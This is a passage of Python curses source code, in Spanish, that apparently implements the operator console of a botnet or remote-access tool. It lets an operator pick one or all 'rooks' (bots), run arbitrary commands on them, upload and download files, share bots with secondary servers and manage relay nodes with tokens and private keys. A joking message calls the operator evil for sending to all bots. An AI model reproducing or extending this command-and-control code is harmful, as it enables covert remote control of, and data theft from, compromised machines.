                uniqkey = jacob_obj.uniqkey()

                if not (_update_uniqkey(uniqkey) == True):

                    savetty()
                    print('¡Error actualizando la clave única!')
                    refresh(stdscr)
                    _exit = True
                    break

            uniqkey_window.erase()
            if (len(uniqkey) > getmaxyx(uniqkey_window)[1]):
                uniqkey_window.addstr('%s...' % (uniqkey[:(getmaxyx(uniqkey_window)[1])+4*-1]))
            else:
                uniqkey_window.addstr(uniqkey)
            uniqkey_window.refresh()
            window_bots.refresh(_top,_left, 0,0, max_y-4,(max_x//4)+3)

            for _ in message:

                if (len(_) > _max_message):

                    _max_message = len(_)

            _update_logs(window_logs, message[num:], _min_index)

            _cmds = ''
            _index = cmds[_current_command:]

            for _ in _index:

                _ = _[1]

                if not (_ == _index[0]):

                    _cmds += '%s  ' % (_)

                else:

                    _cmds += '*%s*  ' % (_)

            window_commands.erase()
            window_commands.border(1, 1, 1, '-', 1, 1, 1, 1)
            window_commands.addstr(_cmds[:(getmaxyx(window_commands)[1])+2*-1])
            window_commands.refresh()

            _key = window_commands.getch()

            if (_key == 27):

                _exit = True
                break

            elif (_key == 21):

                _copy_content(jacob_obj.uniqkey(), panel_pop_copy)

            elif (_key == 24):

                _copy_content('\n'.join(message), panel_pop_copy)

            elif (_key == 1):

                if (all_ == False):

                    all_ = True
                    message.append('¡Envío a todos los rooks activado! 3:)')

                else:

                    message.append('¿Otra vez quieres activar esta opción?... Sí que eres malvado/a :O')

            elif (_key == 2):

                if not (all_ == False):

                    all_ = False
                    message.append('Envío a todos los rooks desactivado... :c')

                else:

                    message.append('¡Ya está desactivado!')

            elif (_key == curses.KEY_RIGHT):

                if (_current_command < len(cmds)-1):

                    _current_command += 1

                else:

                    _current_command = 0

            elif (_key == curses.KEY_LEFT):

                if (_current_command > 0):
                
                    _current_command -= 1

                else:

                    _current_command = len(cmds)-1

            elif (_key == 114):

                if (_left < _max_text-10):

                    _left += 1

                else:

                    _left = 0

            elif (_key == 108):

                if (_left > 0):

                    _left -= 1

                else:

                    _left = _max_text-10

            elif (_key == 19):

                salts = _int_interact_popup(pop_salts_settings, panel_salts_settings, window_logs, salts, 6)

            elif (_key == curses.KEY_DOWN):

                if (num < len(message)-1):

                    num += 1+salts

                else:

                    num = 0

            elif (_key == curses.KEY_UP):

                if (num == 0):

                    num = len(message)-1

                else:

                    num -= 1+salts

            elif (_key == 18):

                if (_min_index < _max_message-10):

                    _min_index += 1

            elif (_key == 12):

                if (_min_index > 0):

                    _min_index -= 1

            elif (_key == 116):

                if (_top < len(_bots[1][1])-1):

                    _top += 1
                    _bot_id = _top

                else:

                    _top = 0
                    _bot_id = _top

            elif (_key == 98):

                if (_top > 0):

                    _top -= 1
                    _bot_id = _top

                else:

                    _top = len(_bots[1][1])-1
                    _bot_id = _top

            elif (_key == curses.KEY_RESIZE):

                break

            elif (_key == 10):

                _bak_cmd = cmds[_current_command]

                if (_bak_cmd[0] == False) and (all_ == True):

                    message.append('Es mejor que lo vuelvas a intentar sin usar todos los rooks, porque no puedes ejecutar "{}" varias veces...'.format(_bak_cmd[1]))
                    continue

                _cmd = _bak_cmd[1].lower()
                _current_bots_id = [list(_bots[1][1])[_top]] if (all_ == False) else list(_bots[1][1])
                _init_time = time()

                for _current_bot_id in _current_bots_id:

                    message.append('')
                    message.append('Ejecutando -> %s; Current ROOK-ID:(%s) ...' % (_bak_cmd[1], _current_bot_id))
                    message.append('')

                    _update_logs(window_logs, message[num:], _min_index)

                    if (_cmd == 'ping'):

                        _control('Se envio una petición ping correctamente. El servidor respondio con un PONG: PING-PONG ...')
                        _control.ping()

                    elif (_cmd == 'addqueue'):

                        _cmd_to_queue = _simplyArchitecture(pop_window, panel_pop_window, 'Comando:', _cmd_to_queue, 1, 3)

                        if (_cmd_to_queue == ''):

                            message.append('¡No escribió ningún comando!')

                        else:

                            _data_to_queue = _simplyArchitecture(pop_window, panel_pop_window, 'Datos:', _data_to_queue, 1, 3)

                            _control.addQueue(_current_bot_id, _cmd_to_queue, _data_to_queue)

                    elif (_cmd == 'listbots'):

                        _limits = _int_interact_popup(pop_limits, panel_limits, window_logs, _limits, 6)

                        _pattern = _simplyArchitecture(pop_window, panel_pop_window, 'Patrón de búsqueda:', _pattern, 1, 3)

                        _control.listBots(_limits, _pattern)

                    elif (_cmd == 'access_list'):

                        _limits_for_access_list = _int_interact_popup(pop_limits, panel_limits, window_logs, _limits_for_access_list, 6)
                        
                        _control.access_list(_limits_for_access_list)

                    elif (_cmd == 'gettoken'):

                        _control.getToken()

                    elif (_cmd == 'listservers'):

                        _limits_for_server = _int_interact_popup(pop_limits, panel_limits, window_logs, _limits_for_server, 6)

                        _control.listServers(_current_bot_id, _limits_for_server)

                    elif (_cmd == 'getcommands'):

                        _limits_for_commands = _int_interact_popup(pop_limits, panel_limits, window_logs, _limits_for_commands, 6)

                        _control.getCommands(_current_bot_id, _limits_for_commands)

                    elif (_cmd == 'getdata'):

                        _limits_for_data = _int_interact_popup(pop_limits, panel_limits, window_logs, _limits_for_data, 6)
                        
                        _control.getData(_current_bot_id, _limits_for_data)

                    elif (_cmd == 'getnodes'):

                        _node_id = _simplyArchitecture(pop_window, panel_pop_window, 'Identificador del nodo:', _node_id, 1, 3)

                        message.append('¡No se introdujo ningún identificador!') if (_node_id == '') else _control.getNodes(_node_id)

                    elif (_cmd == 'executecommand'):

                        _command_to_execute = _simplyArchitecture(pop_window, panel_pop_window, 'Comando a ejecutar:', _command_to_execute, 1, 3)

                        message.append('Error ejecutando el comando. No se introdujo ningún comando ...') if (_command_to_execute == '') else _control.executeCommand(_current_bot_id, _command_to_execute)

                    elif (_cmd == 'addnode'):

                        _node_id = _simplyArchitecture(pop_window, panel_pop_window, 'Identificador del nodo:', _node_id, 1, 3)
                        
                        if (_node_id == ''):

                            message.append('¡No se introdujo ningún identificador!')

                        else:

                            _node_to_add = _simplyArchitecture(pop_window, panel_pop_window, 'Dirección del nodo:', _node_to_add, 1, 3)

                            if (_node_to_add == ''):

                                message.append('¡No se introdujo ninguna dirección de un nuevo nodo!')

                            else:

                                _node_to_add_token = _simplyArchitecture(pop_window, panel_pop_window, 'Token de acceso:', _node_to_add_token, 1, 3)

                                if (_node_to_add_token == ''):

                                    message.append('¡No se introdujo ningún token de acceso publico!')

                                else:


                                    _node_to_add_secret_key = _simplyArchitecture(pop_window, panel_pop_window, 'Clave secreta:', _node_to_add_secret_key, 1, 3)

                                    if (_node_to_add_secret_key == ''):

                                        message.append('¡No se introdujo ninguna clave secreta!')

                                    else:

                                        _control.addNode(_node_id, [_node_to_add, _node_to_add_token, _node_to_add_secret_key])

                    elif (_cmd == 'delnodes'):

                        _node_id = _simplyArchitecture(pop_window, panel_pop_window, 'Identificador del nodo:', _node_id, 1, 3)

                        if (_node_id == ''):

                            message.append('¡No se introdujo ningún identificador!')

                        else:
                            
                            _node_to_add = _simplyArchitecture(pop_window, panel_pop_window, 'Indíce o dirección:', _node_to_add, 1, 3)

                            if (_node_to_add == ''):

                                message.append('No se introdujo ningún indíce o dirección')

                            else:

                                _control.delNodes(_node_id, _node_to_add)

                    elif (_cmd == 'delserver'):

                        _index_to_server = _int_interact_popup(pop_index_to_server, panel_index_to_server, window_logs, _index_to_server, 6)

                        if (_index_to_server == ''):

                            message.append('Error borrando el servidor secundario de "%s"' % (_current_bot_id))

                        else:

                            _control.delServer(_current_bot_id, _index_to_server)

                    elif (_cmd == 'sharebot'):
                        
                        _secundaryServerAddr = _simplyArchitecture(pop_window, panel_pop_window, 'Dirección del servidor:', _secundaryServerAddr, 1, 3)

                        if (_secundaryServerAddr == ''):

                            message.append('¡No se introdujo ninguna dirección del servidor secundario!')

                        else:

                            _node_to_add_token = _simplyArchitecture(pop_window, panel_pop_window, 'Token de acceso:', _node_to_add_token, 1, 3)

                            if (_node_to_add_token == ''):

                                message.append('¡No se introdujo ningún token de acceso publico!')

                            else:

                                _share_files = _int_interact_popup(pop_share_files, panel_share_files, window_logs, _share_files, 4)

                                if (_share_files == 0):

                                    _share = False

                                else:

                                    _share = True

                                _control.shareBot(_current_bot_id, _secundaryServerAddr, _node_to_add_token, headers_for_share_bot, _share)

                    elif (_cmd == 'updatenode'):

                        _node_id = _simplyArchitecture(pop_window, panel_pop_window, 'Identificador del nodo:', _node_id, 1, 3)

                        if (_node_id == ''):

                            message.append('¡No se introdujo ningún identificador!')

                        else:

                            _node_new_value = _simplyArchitecture(pop_window, panel_pop_window, 'Nuevo valor:', _node_new_value, 1, 3)
                            
                            if not (_node_new_value == ''):
                            
                                _node_data_index = _simplyArchitecture(pop_window, panel_pop_window, 'Indíce:', _node_data_index, 1, 3)
                                _node_data_subindex = _simplyArchitecture(pop_window, panel_pop_window, 'Sub-índice:', _node_data_index, 1, 3)
                                _control.updateNode(_node_id, _node_new_value, _node_data_index, _node_data_subindex)

                            else:

                                message.append('¡No se agrego un nuevo valor!')

                    elif (_cmd == 'usenodes'):

                        _node_id = _simplyArchitecture(pop_window, panel_pop_window, 'Identificador del nodo:', _node_id, 1, 3)

                        if (_node_id == ''):

                            message.append('¡No se introdujo ningún identificador!')

                        else:

                            if not (_control.useNodes(_node_id) == False):

                                if (_update_listBots(window_bots, jacob_obj) == False):

                                    _exit = True
                                    break

                    elif (_cmd == 'sharedfiles'):

                        _limits_for_shared_files = _int_interact_popup(pop_limits, panel_limits, window_logs, _limits_for_shared_files, 6)

                        _pattern = _simplyArchitecture(pop_window, panel_pop_window, 'Patrón de búsqueda:', _pattern, 1, 3)

                        _control.sharedFiles(_current_bot_id, _limits_for_list_files, _pattern)

                    elif (_cmd == 'listfiles'):

                        _limits_for_list_files = _int_interact_popup(pop_limits, panel_limits, window_logs, _limits_for_list_files, 6)

                        _pattern = _simplyArchitecture(pop_window, panel_pop_window, 'Patrón de búsqueda:', _pattern, 1, 3)

                        _control.listFiles(_current_bot_id, _limits_for_list_files, _pattern)

                    elif (_cmd == 'nousenodes'):

                        if not (jacob_obj.use_nodes == False):

                            message.append('Dejado: "%s"' % (jacob_obj.use_nodes))
                            _control.noUseNodes()
                    
                            if (_update_listBots(window_bots, jacob_obj) == False):

                                _exit = True
                                break
                            
                        else:

                            message.append('¡Actualmente no hay ningún nodo en uso!')

                    elif (_cmd == 'updatelistbots'):

                        _limits = _int_interact_popup(pop_limits, panel_limits, window_logs, _limits, 6)

                        _pattern = _simplyArchitecture(pop_window, panel_pop_window, 'Patrón de búsqueda:', _pattern, 1, 3)

                        if (_update_listBots(window_bots, jacob_obj, _limits, _pattern) == False):

                            _exit = True
                            break

                    elif (_cmd == 'getpeers'):

                        _control.getPeers()

                    elif (_cmd == 'upload'):

                        _filename = _simplyArchitecture(pop_window, panel_pop_window, 'Nombre del archivo:', _filename, 1, 3)

                        if (_filename == ''):

                            message.append('No se introdujo el nombre del archivo a subir ...')

                        else:

                            if not (os.path.exists(_filename)):

                                message.append('El archivo/directorio no existe ...')

                            else:

                                if (os.path.isdir(_filename)):

                                    _recursive = _int_interact_popup(pop_recursive, panel_pop_recursive, window_logs, _recursive, 3)

                                    if (_recursive == 0):

                                        _recurs = False
                                        _recursive_limit = 0

                                    else:

                                        _recurs = True
                                        _recursive_limit = _int_interact_popup(pop_limits, panel_limits, window_logs, _recursive_limit, 6)

                                else:

                                    _recurs = False
                                    _recursive_limit = 0

                                _control.upload(_filename, _current_bot_id, _recurs, _recursive_limit)

                    elif (_cmd == 'download'):
                        
                        _filename = _simplyArchitecture(pop_window, panel_pop_window, 'Nombre de entrada:', _filename, 1, 3)

                        if (_filename == ''):

                            message.append('No se introdujo ningún nombre de archivo a descargar ...')

                        else:

                            _outname = _simplyArchitecture(pop_window, panel_pop_window, 'Nombre de salida:', _outname, 1, 3)

                            if (_outname == ''):

                                message.append('No se introdujo ningún nombre de archivo a guardar ...')

                            else:

                                message.append('Descargando: "%s" ...' % (_filename))

                                _control.download(_filename, _outname, _current_bot_id)

                    elif (_cmd == 'writenodes'):

                        _nodes = []

                        while (True):

                            _node_to_add = _simplyArchitecture(pop_window, panel_pop_window, 'Dirección del nodo:', _node_to_add, 1, 3)

                            if (_node_to_add == '0'):

                                break

                            elif (_node_to_add == ''):

                                message.append('¡No se introdujo ninguna dirección de un nuevo nodo!')

                            else:

                                _node_to_add_token = _simplyArchitecture(pop_window, panel_pop_window, 'Token de acceso:', _node_to_add_token, 1, 3)

                                if (_node_to_add_token == ''):

                                    message.append('¡No se introdujo ningún token de acceso publico!')

                                else:

                                    _node_to_add_secret_key = _simplyArchitecture(pop_window, panel_pop_window, 'Clave secreta:', _node_to_add_secret_key, 1, 3)

                                    if (_node_to_add_secret_key == ''):

                                        message.append('¡No se introdujo ninguna clave secreta!')

                                    else:

                                        _nodes.append([_node_to_add, _node_to_add_token, _node_to_add_secret_key])

                        _node_to_add = _simplyArchitecture(pop_window, panel_pop_window, 'Dirección del servidor:', _node_to_add, 1, 3)

                        if (_node_to_add == ''):

                            message.append('¡No se introdujo ningún servidor final!')

                        else:

                            _node_username = _simplyArchitecture(pop_window, panel_pop_window, 'Nombre de usuario:', _node_username, 1, 3)
                            _node_passphrase = _simplyArchitecture(pop_window, panel_pop_window, 'Frase de contraseña:', _node_passphrase, 1, 3)
                            _node_uniqkey = _simplyArchitecture(pop_window, panel_pop_window, 'Clave única:', _node_uniqkey, 1, 3)
                            _node_pub_key = _simplyArchitecture(pop_window, panel_pop_window, 'Clave pública:', _node_pub_key, 1, 3)
                            _node_priv_key = _simplyArchitecture(pop_window, panel_pop_window, 'Clave privada:', _node_priv_key, 1, 3)
                            _node_recover = _simplyArchitecture(pop_window, panel_pop_window, 'Recover (1) o (0):', str(_node_recover), 1, 3)
                            _node_iterations = _simplyArchitecture(pop_window, panel_pop_window, 'Iteraciones:', str(_node_iterations), 1, 3)
                            _node_security_number = _simplyArchitecture(pop_window, panel_pop_window, 'Número de seguridad:', str(_node_security_number), 1, 3)
                            _node_decrement_number = _simplyArchitecture(pop_window, panel_pop_window, 'Número de decremento:', str(_node_decrement_number), 1, 3)
                            _node_chars = _simplyArchitecture(pop_window, panel_pop_window, 'Caracteres de seguridad:', _node_chars, 1, 3)

                            if (os.path.isfile(_node_pub_key)) and (os.path.isfile(_node_priv_key)):

                                _tmp_data = [_node_to_add, _node_username, _node_passphrase, _node_uniqkey, open(_node_pub_key, 'rt').read(), open(_node_priv_key, 'rt').read(), False if (_node_recover == '0') else True, _node_iterations, _node_security_number, _node_decrement_number, _node_chars]

                                if not ('' in _tmp_data):

                                    _control.writeNodes(_nodes, _tmp_data)

                                else:

                                    message.append('¡Faltan valores por definir!')

                            else:

                                message.append('No se encontro la clave pública o privada ...')

                    else:

                        curses.beep()

                    message.append('')
                    message.append('Ejecutado -> %s; Current ROOK-ID:(%s): Finalizado en: "%.4f" ...' % (_bak_cmd[1], _current_bot_id, time()-_init_time))
                    message.append('')

# END BODY

# INIT GENERAL

def init(): 

    stdscr.keypad(1)
    curses.raw()
    curses.noecho()
    curses.curs_set(0)
    curses.mousemask(curses.ALL_MOUSE_EVENTS)
    
    if not (curses.has_colors()):

        stdscr.addstr('Tu terminal no acepta colores ... No se puede continuar con la operación ...')
        getch(stdscr)
        end()
    
    curses.start_color()
    curses.use_default_colors()

def end():

    stdscr.keypad(0)
    curses.noraw()
    curses.echo()
    curses.curs_set(2)
    curses.mousemask(0)
    curses.endwin()

def savetty():

    curses.def_prog_mode()
    curses.endwin()

# END GENERAL

# INIT UTILS

def exit_force(response):

    if not (response.status_code == 200):
        
        savetty()
        print('Error con el código de estado: CODE: %d' % (response.status_code))
        refresh(stdscr)
        end()

def refresh(window):

    window.refresh()

def getch(window):

    return(window.getch())

def set_color(color_id, fg_color, bg_color):

    _color = curses.init_pair(color_id, fg_color, bg_color)

    return(color_id)

def use_color(color_id):

    return(curses.color_pair(color_id))

def getmaxyx(window):

    return(window.getmaxyx())

def mouse_interface(sy, sx, wy, wx, string_length, events):

    (mouse_id, x, y, z, bstate) = events

    com_y = sy+wy
    com_x = sx+wx
    max_x = com_x+string_length

    if (y == com_y) and ((x == com_x) or ((x > com_x-1)) and (x < max_x)):

        return(True)

    else:

        return(False)

def _detect():

    (max_y, max_x) = getmaxyx(stdscr)

    return((max_y < min_y) or (max_x < min_x))

# END UTILS

# INIT WINDOW

def create_window(height, width, y, x):

    _window = curses.newwin(height, width, y, x)
    _window.keypad(1)

    return(_window)

def create_subwindow(window, height, width, y, x):

    _window = window.subwin(height, width, y, x)
    _window.keypad(1)

    return(_window)

def create_pad(height, width):

    return(curses.newpad(height, width))

# END WINDOW

# INIT PANEL

def new_panel(window):

    return(curses.panel.new_panel(window))

def update_panels():

    curses.panel.update_panels()
    curses.doupdate()

# END PANEL

def main(std):

    global stdscr, key

    stdscr = std

    init()

    if (_detect()):
        
        savetty()
        print(error_dimentions)
        refresh(stdscr)

    else:

        set_color(1, curses.COLOR_WHITE, curses.COLOR_BLUE)
        set_color(2, curses.COLOR_RED, curses.COLOR_WHITE)
        set_color(3, curses.COLOR_YELLOW, curses.COLOR_WHITE)
        set_color(4, curses.COLOR_WHITE, curses.COLOR_WHITE)

        stdscr.bkgd(use_color(1)+curses.A_BOLD)

        try:
        
            _result = login()

        except curses.error:

            savetty()
            print('Error dibujando...')
            refresh(stdscr)

        else:

            if not (_result == False):

                interact(_result)

    end()
    
if __name__ == '__main__':

    curses.wrapper(main)
